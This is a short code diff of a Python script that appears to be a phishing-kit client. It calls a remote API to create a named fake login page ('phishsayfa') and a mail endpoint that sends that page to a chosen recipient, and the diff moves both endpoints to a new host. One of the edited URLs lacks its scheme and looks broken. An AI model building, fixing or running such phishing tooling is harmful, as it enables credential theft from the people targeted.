@@ -48,7 +48,7 @@ else:
         loading_animation()
         os.system("clear")
 
-        api_url_sayfa = "https://socials.con.tc/api/yenisayfa.php"
+        api_url_sayfa = "smmslowy-001-site1.atempurl.com/api/yenisayfa.php"
         params_sayfa = {"sayfaismi": sayfaismi, "mail": mail}
 
         response_sayfa = requests.get(api_url_sayfa, params=params_sayfa)
@@ -67,7 +67,7 @@ else:
             phishsayfa = f"https://socials.con.tc/login/{sayfaismi}.php"
             
             if to:
-                api_url_mail = "https://socials.con.tc/mail/mail.php"
+                api_url_mail = "https://smmslowy-001-site1.atempurl.com/mail/mail.php"
 
                 data_mail = {
                     'to': to,
